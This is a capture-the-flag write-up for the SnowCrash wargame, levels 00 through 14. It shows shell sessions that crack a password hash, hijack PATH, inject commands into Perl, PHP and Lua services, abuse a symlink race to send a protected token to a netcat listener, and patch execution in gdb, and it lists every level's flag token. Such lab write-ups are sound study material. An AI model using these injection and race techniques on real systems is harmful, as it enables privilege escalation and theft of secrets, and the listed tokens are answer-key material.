# snow-crash

## LEVEL 00

```sh
level00@SnowCrash:~$ ls -la
level00@SnowCrash:~$ find / -name flag00 2>/dev/null 
level00@SnowCrash:~$ find / -user flag00 2>/dev/null 
/usr/sbin/john
/rofs/usr/sbin/john
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
level00@SnowCrash:~$ su flag00
Password: 
su: Authentication failure
```

> Seems that the password `cdiiddwpgswtgt` is incrypted

### Decryption:
- [base64decode](https://www.base64decode.org/)
- [dcode](https://www.dcode.fr/cipher-identifier)
- [devglan](https://www.devglan.com/online-tools/text-encryption-decryption)

> Seems that's the code doesn't use any of the common incryptions let's try rotations

### Rotation:
- [CacheSleuth](https://www.cachesleuth.com/rot.html#:~:text=Provides%20the%20option%20to%20rotate,25%20either%20encrypted%20or%20decrypted.) ==> **rot11** is the only human readable result `nottoohardhere`

- login to flag00 using `nottoohardhere` as password

```sh
level00@SnowCrash:~$ su flag00
Password: 
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```

## LEVEL 01

```sh
...
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

> tried all as level00 nothing works

- JohnTheRipper using a [wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) ==> `abcdefg`

```sh
imane@IMane-PC:~$ echo 42hDRfypTqqnw > /tmp/pass.txt | john --wordlist=Documents/rockyou.txt /tmp/pass.txt 
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
No password hashes left to crack (see FAQ)
imane@IMane-PC:~$ john --show  /tmp/password.txt
?:abcdefg

1 password hash cracked, 0 left
```

```sh
level01@SnowCrash:~$ su flag01
Password: 
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

## LEVEL 02

```sh
level02@SnowCrash:~$ ls -l
total 12
----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
level02@SnowCrash:~$ scp ~/level02.pcap imane@$IMANE_IP:/tmp
Could not create directory '/home/user/level02/.ssh'.
The authenticity of host '192.168.1.12 (192.168.1.12)' can't be established.
ECDSA key fingerprint is f0:f5:02:95:2a:28:f3:60:80:02:96:a2:f9:05:7a:39.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level02/.ssh/known_hosts).
imane@192.168.1.12's password: 
level02.pcap                                                       100% 8302     8.1KB/s   00:00 
```

```sh
imane@IMane-PC:~$ # wireshark -r /tmp/level02.pcap # or
imane@IMane-PC:~$ tshark -r /tmp/level02.pcap -Y "tcp.flags == 0x18" -x
```

```pcap
0000  00 24 1d 0f 00 ad 08 00 27 cc 8a 1e 08 00 45 00   .$......'.....E.
0010  00 41 d4 b3 40 00 40 06 16 77 3b e9 eb df 3b e9   .A..@.@..w;...;.
0020  eb da 2f 59 99 4f ba a8 fb 18 9d 18 15 7b 80 18   ../Y.O.......{..
0030  01 c5 27 9d 00 00 01 01 08 0a 02 c2 3c 62 01 1b   ..'.........<b..
0040  b9 87 00 0d 0a 50 61 73 73 77 6f 72 64 3a 20      .....Password: 

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a0 fb 40 00 40 06 4a 2b 3b e9 eb da 3b e9   .5..@.@.J+;...;.
0020  eb df 99 4f 2f 59 9d 18 15 7b ba a8 fb 25 80 18   ...O/Y...{...%..
0030  00 73 92 a7 00 00 01 01 08 0a 01 1b bc c2 02 c2   .s..............
0040  3c 62 66                                          <bf

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a0 fc 40 00 40 06 4a 2a 3b e9 eb da 3b e9   .5..@.@.J*;...;.
0020  eb df 99 4f 2f 59 9d 18 15 7c ba a8 fb 25 80 18   ...O/Y...|...%..
0030  00 73 7c 30 00 00 01 01 08 0a 01 1b bd 1b 02 c2   .s|0............
0040  44 7f 74                                          D.t

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a0 fd 40 00 40 06 4a 29 3b e9 eb da 3b e9   .5..@.@.J);...;.
0020  eb df 99 4f 2f 59 9d 18 15 7d ba a8 fb 25 80 18   ...O/Y...}...%..
0030  00 73 90 1c 00 00 01 01 08 0a 01 1b bd 59 02 c2   .s...........Y..
0040  45 54 5f                                          ET_

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a0 fe 40 00 40 06 4a 28 3b e9 eb da 3b e9   .5..@.@.J(;...;.
0020  eb df 99 4f 2f 59 9d 18 15 7e ba a8 fb 25 80 18   ...O/Y...~...%..
0030  00 73 77 51 00 00 01 01 08 0a 01 1b bd 88 02 c2   .swQ............
0040  45 ef 77                                          E.w

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a0 ff 40 00 40 06 4a 27 3b e9 eb da 3b e9   .5..@.@.J';...;.
0020  eb df 99 4f 2f 59 9d 18 15 7f ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 8c c4 00 00 01 01 08 0a 01 1b bd 9f 02 c2   .s..............
0040  46 64 61                                          Fda

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 00 40 00 40 06 4a 26 3b e9 eb da 3b e9   .5..@.@.J&;...;.
0020  eb df 99 4f 2f 59 9d 18 15 80 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 7f 72 00 00 01 01 08 0a 01 1b bd b6 02 c2   .s.r............
0040  46 9e 6e                                          F.n

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 01 40 00 40 06 4a 25 3b e9 eb da 3b e9   .5..@.@.J%;...;.
0020  eb df 99 4f 2f 59 9d 18 15 81 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 89 2a 00 00 01 01 08 0a 01 1b bd c4 02 c2   .s.*............
0040  46 d7 64                                          F.d

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 02 40 00 40 06 4a 24 3b e9 eb da 3b e9   .5..@.@.J$;...;.
0020  eb df 99 4f 2f 59 9d 18 15 82 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 7a e4 00 00 01 01 08 0a 01 1b bd e6 02 c2   .sz.............
0040  46 fa 72                                          F.r

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 03 40 00 40 06 4a 23 3b e9 eb da 3b e9   .5..@.@.J#;...;.
0020  eb df 99 4f 2f 59 9d 18 15 83 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 6c f0 00 00 01 01 08 0a 01 1b be 84 02 c2   .sl.............
0040  47 4f 7f                                          GO.

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 04 40 00 40 06 4a 22 3b e9 eb da 3b e9   .5..@.@.J";...;.
0020  eb df 99 4f 2f 59 9d 18 15 84 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 6b 3f 00 00 01 01 08 0a 01 1b be a9 02 c2   .sk?............
0040  48 da 7f                                          H..

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 05 40 00 40 06 4a 21 3b e9 eb da 3b e9   .5..@.@.J!;...;.
0020  eb df 99 4f 2f 59 9d 18 15 85 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 6a bc 00 00 01 01 08 0a 01 1b be ce 02 c2   .sj.............
0040  49 37 7f                                          I7.

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 06 40 00 40 06 4a 20 3b e9 eb da 3b e9   .5..@.@.J ;...;.
0020  eb df 99 4f 2f 59 9d 18 15 86 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 9b 12 00 00 01 01 08 0a 01 1b bf 1b 02 c2   .s..............
0040  49 93 4e                                          I.N

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 07 40 00 40 06 4a 1f 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 87 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 a4 3c 00 00 01 01 08 0a 01 1b bf 2f 02 c2   .s.<........./..
0040  4a 54 44                                          JTD

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 08 40 00 40 06 4a 1e 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 88 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 95 60 00 00 01 01 08 0a 01 1b bf d8 02 c2   .s.`............
0040  4a 86 52                                          J.R

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 09 40 00 40 06 4a 1d 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 89 ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 80 36 00 00 01 01 08 0a 01 1b c0 5b 02 c2   .s.6.........[..
0040  4c 2c 65                                          L,e

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0a 40 00 40 06 4a 1c 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8a ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 77 c1 00 00 01 01 08 0a 01 1b c0 87 02 c2   .sw.............
0040  4d 74 6c                                          Mtl

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0b 40 00 40 06 4a 1b 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8b ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 64 14 00 00 01 01 08 0a 01 1b c0 c5 02 c2   .sd.............
0040  4d e2 7f                                          M..

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0c 40 00 40 06 4a 1a 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8c ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 96 67 00 00 01 01 08 0a 01 1b c0 d6 02 c2   .s.g............
0040  4e 7d 4c                                          N}L

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0d 40 00 40 06 4a 19 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8d ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 b2 20 00 00 01 01 08 0a 01 1b c0 f1 02 c2   .s. ............
0040  4e a8 30                                          N.0

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0e 40 00 40 06 4a 18 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8e ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 95 d9 00 00 01 01 08 0a 01 1b c0 f4 02 c2   .s..............
0040  4e eb 4c                                          N.L

0000  08 00 27 cc 8a 1e 00 24 1d 0f 00 ad 08 00 45 10   ..'....$......E.
0010  00 35 a1 0f 40 00 40 06 4a 17 3b e9 eb da 3b e9   .5..@.@.J.;...;.
0020  eb df 99 4f 2f 59 9d 18 15 8f ba a8 fb 25 80 18   ...O/Y.......%..
0030  00 73 d4 7b 00 00 01 01 08 0a 01 1b c1 4a 02 c2   .s.{.........J..
0040  4e f2 0d                                          N..
```

> 66 74 5f 77 61 62 64 72  7f  7f  7f 4e 44 52 65 6c  7f 4c 30 4c 0d
> 
>  f  t  _  w  a  n  d  r DEL DEL DEL  N  D  R  e  l DEL  L  0  L \r
> 
>  ==> `ft_waNDReL0L`

```sh
level02@SnowCrash:~$ su level03
Password: 
su: Authentication failure
level02@SnowCrash:~$ su flag02
Password: 
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
```

## LEVEL 03

```sh
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```

```sh
level03@SnowCrash:~$ strings level03 
...
/usr/bin/env echo Exploit me
...
```

```sh
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Exploit me
level03@SnowCrash:~$ mktemp -d
/tmp/tmp.q40U8SnOre
level03@SnowCrash:~$ echo getflag > /tmp/tmp.q40U8SnOre/echo
level03@SnowCrash:~$ chmod 777 /tmp/tmp.q40U8SnOre/echo -R
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Exploit me
level03@SnowCrash:~$ PATH=/tmp/tmp.q40U8SnOre:$PATH
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## LEVEL 04

```sh
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html


level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
level04@SnowCrash:~$
level04@SnowCrash:~$ curl localhost:4747 -d 'x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## LEVEL 05

```sh
...
level05@SnowCrash:~$ find / -user flag05 2>/dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$ echo "getflag | wall" > /opt/openarenaserver/getflag
# after while
                                                                               
Broadcast Message from flag05@Snow                                             
        (somewhere) at 21:32 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc                      
                                                             
```

## LEVEL 06

```sh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

> ###TEST
> 
> level06@SnowCrash:~$ echo "hello world" > /tmp/tmp.tpBYsyE1Gs/test
> 
> level06@SnowCrash:~$ ./level06 /tmp/tmp.tpBYsyE1Gs/test
> 
> hello world

```sh
level06@SnowCrash:~$ mktemp -d 
/tmp/tmp.tpBYsyE1Gs
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/tmp.tpBYsyE1Gs/getflag
level06@SnowCrash:~$ chmod 777 /tmp/tmp.tpBYsyE1Gs -R
level06@SnowCrash:~$ ./level06 /tmp/tmp.tpBYsyE1Gs/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```

## LEVEL 07

```sh
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$ ./level07 
level07
```

```sh
level07@SnowCrash:~$ strings level07
...
LOGNAME
...
getenv
...
```

```sh
level07@SnowCrash:~$ LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## LEVEL 08

```sh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
level08@SnowCrash:~$ strings
l^C	
level08@SnowCrash:~$ strings level08 
...
strstr
read
open
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
....
level08@SnowCrash:~$ echo token > /tmp/tmp.7wQAhd2Ztt/toke
level08@SnowCrash:~$ ./level08  /tmp/tmp.7wQAhd2Ztt/toke
token
level08@SnowCrash:~$ echo token > /tmp/tmp.7wQAhd2Ztt/token
level08@SnowCrash:~$ ./level08  /tmp/tmp.7wQAhd2Ztt/token
You may not access '/tmp/tmp.7wQAhd2Ztt/token'
level08@SnowCrash:~$ mktemp -d
/tmp/tmp.4278W4SioX
level08@SnowCrash:~$ chmod +rwx /tmp/tmp.4278W4SioX
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/tmp.4278W4SioX/link
level08@SnowCrash:~$ ./level08 /tmp/tmp.4278W4SioX/link
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## LEVEL 09

```sh
level09@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
----r--r-- 1 flag09 level09   26 Mar  5  2016 token
level09@SnowCrash:~$ ./level09 token 
tpmhr
level09@SnowCrash:~$ ./level09 123
135
level09@SnowCrash:~$ ./level09 123456789
13579;=?A
level09@SnowCrash:~$ ./level09 abc
ace
level09@SnowCrash:~$ ./level09 abcdefgh
acegikmo

```

> char + index
>
> decode => char - index

```sh
level09@SnowCrash:~$ mktemp -d
/tmp/tmp.qCCX4MLHCw
level09@SnowCrash:~$ chmod +rwx /tmp/tmp.qCCX4MLHCw
level09@SnowCrash:~$ cd /tmp/tmp.qCCX4MLHCw
vim decode.c
```

```
#include <stdio.h>
#include <stdlib.h>

int main() {
        FILE    *file;
        char    c;
        int     i = 0;

        file = fopen("/home/user/level09/token", "r");

        if (NULL == file)
                return EXIT_FAILURE;

        while ((c = fgetc(file)) != EOF && (c != '\n'))
                printf("%c", c - i++);

        printf("\n");
        fclose(file);
        return 0;
}
```

```sh
level09@SnowCrash:/tmp/tmp.qCCX4MLHCw$ gcc -o decode decode.c 
level09@SnowCrash:/tmp/tmp.qCCX4MLHCw$ ./decode 
f3iji1ju5yuevaus41q1afiuq
level09@SnowCrash:/tmp/tmp.qCCX4MLHCw$ su flag09
Password: 
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
```

## LEVEL 10

```sh
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ strings level10 
...
access
...
level10@SnowCrash:~$ man access
...
NOTES
       Warning:  Using  access()  to  check  if  a user is authorized to, for example, open a file
       before actually doing so using open(2) creates a security  hole,  because  the  user  might
       exploit  the  short  time  interval between checking and opening the file to manipulate it.
       For this reason, the use of this system call should  be  avoided.   (In  the  example  just
       described,  a safer alternative would be to temporarily switch the process's effective user
       ID to the real ID and then call open(2).)
...
level10@SnowCrash:/tmp/tmp.C2oddsN04P$ 
```

### terminal 1
```
level10@SnowCrash:/tmp/tmp.TIGospeoP7$ mktemp
/tmp/tmp.44KCdpq0hb
level10@SnowCrash:/tmp/tmp.TIGospeoP7$ while true; do ln -fs /home/user/level10/token /tmp/link ; ln -fs /tmp/tmp.44KCdpq0hb  /tmp/link ; done
```

### terminal 2
```
level10@SnowCrash:~$ while true; do ./level10 /tmp/link 192.168.1.11  > /dev/null; done
```

### terminal 3
```
level10@SnowCrash:~$ nc -lk 6969 | grep -v '.*( )*.'
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
^C
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## LEVEL 11

```sh
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
level11@SnowCrash:~$ netstat -tuln | grep 5151
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag | wall
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 1:11 ...                                                
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..
```

## LEVEL 12

```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ ./level12.pl 
Content-type: text/html

..level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
level12@SnowCrash:~$ vim /tmp/GETFLAG
```

```
getflag | wall
```

```sh
level12@SnowCrash:~$ chmod +rwx /tmp/GETFLAG
level12@SnowCrash:~$ curl localhost:4646 -d 'x=`/*/GETFLAG`'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 1:54 ...                                                
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      

..level12@SnowCrash:~$
```

## LEVEL 13

```sh
level13@SnowCrash:~$ ls -l
total 8
-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
level13@SnowCrash:~$ ./level13 
UID 2013 started us but we we expect 4242
level13@SnowCrash:~$ gdb ./level13 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804858c <+0>:	push   %ebp
   0x0804858d <+1>:	mov    %esp,%ebp
   0x0804858f <+3>:	and    $0xfffffff0,%esp
   0x08048592 <+6>:	sub    $0x10,%esp
   0x08048595 <+9>:	call   0x8048380 <getuid@plt>
   0x0804859a <+14>:	cmp    $0x1092,%eax
   0x0804859f <+19>:	je     0x80485cb <main+63>
   0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
   0x080485a6 <+26>:	mov    $0x80486c8,%edx
   0x080485ab <+31>:	movl   $0x1092,0x8(%esp)
   0x080485b3 <+39>:	mov    %eax,0x4(%esp)
   0x080485b7 <+43>:	mov    %edx,(%esp)
   0x080485ba <+46>:	call   0x8048360 <printf@plt>
   0x080485bf <+51>:	movl   $0x1,(%esp)
   0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
   0x080485cb <+63>:	movl   $0x80486ef,(%esp)
   0x080485d2 <+70>:	call   0x8048474 <ft_des>
   0x080485d7 <+75>:	mov    $0x8048709,%edx
   0x080485dc <+80>:	mov    %eax,0x4(%esp)
   0x080485e0 <+84>:	mov    %edx,(%esp)
   0x080485e3 <+87>:	call   0x8048360 <printf@plt>
   0x080485e8 <+92>:	leave  
   0x080485e9 <+93>:	ret    
End of assembler dump.
(gdb) break main
Breakpoint 1 at 0x804858f
(gdb) run
Starting program: /home/user/level13/level13 

Breakpoint 1, 0x0804858f in main ()
(gdb) # skip the exit
(gdb) jump *0x080485cb
Continuing at 0x80485cb.
your token is 2A31L79asukciNyi8uppkEuSx

Program received signal SIGSEGV, Segmentation fault.
0x0804b008 in ?? ()
(gdb) 
```

## LEVEL 14

```sh
...
level14@SnowCrash:~$ gdb getflag 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /bin/getflag...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
...
   0x08048de3 <+1181>:	jmp    0x8048e2f <main+1257>
   0x08048de5 <+1183>:	mov    0x804b060,%eax
   0x08048dea <+1188>:	mov    %eax,%ebx
   0x08048dec <+1190>:	movl   $0x8049220,(%esp)
   0x08048df3 <+1197>:	call   0x8048604 <ft_des>
   0x08048df8 <+1202>:	mov    %ebx,0x4(%esp)
...
End of assembler dump.
(gdb) break main
Breakpoint 1 at 0x804894a
(gdb) run
Starting program: /bin/getflag 

Breakpoint 1, 0x0804894a in main ()
(gdb) jump *0x08048de5
Continuing at 0x8048de5.
7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
*** stack smashing detected ***: /bin/getflag terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb7f2fd95]
/lib/i386-linux-gnu/libc.so.6(+0x103d4a)[0xb7f2fd4a]
/bin/getflag[0x8048ec7]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb7f2fd95]
/lib/i386-linux-gnu/libc.so.6(+0x103d4a)[0xb7f2fd4a]
/bin/getflag[0x8048ec7]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
/bin/getflag[0x8048571]
======= Memory map: ========
08048000-0804a000 r-xp 00000000 07:00 12700      /bin/getflag
0804a000-0804b000 r--p 00001000 07:00 12700      /bin/getflag
0804b000-0804c000 rw-p 00002000 07:00 12700      /bin/getflag
0804c000-0806d000 rw-p 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r--p 0001b000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rw-p 0001c000 07:00 14117      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rw-p 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r--p 001a3000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rw-p 001a5000 07:00 14123      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rw-p 00000000 00:00 0 
b7fd8000-b7fd9000 rw-p 00000000 00:00 0 
b7fda000-b7fdd000 rw-p 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
